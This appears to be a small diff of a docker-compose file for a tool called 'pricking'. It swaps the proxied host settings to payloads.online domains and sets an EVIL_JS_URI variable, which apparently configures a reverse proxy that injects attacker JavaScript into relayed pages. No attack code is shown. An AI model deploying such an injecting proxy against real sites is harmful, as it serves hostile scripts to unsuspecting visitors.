@@ -7,7 +7,7 @@ services:
     volumes:
      - ./:/tmp/pricking
     environment:
-      PROXY_PASS_HOST: proxy.sng.swzx.com
-      PROXY_SOURCE_HOST: sng.swzx.com
+      PROXY_PASS_HOST: proxy.payloads.online
+      PROXY_SOURCE_HOST: payloads.online
       NGINX_LISTEN_PORT: 80
       EVIL_JS_URI: b026324c6904b2a9cb4b88d6d61c81d1
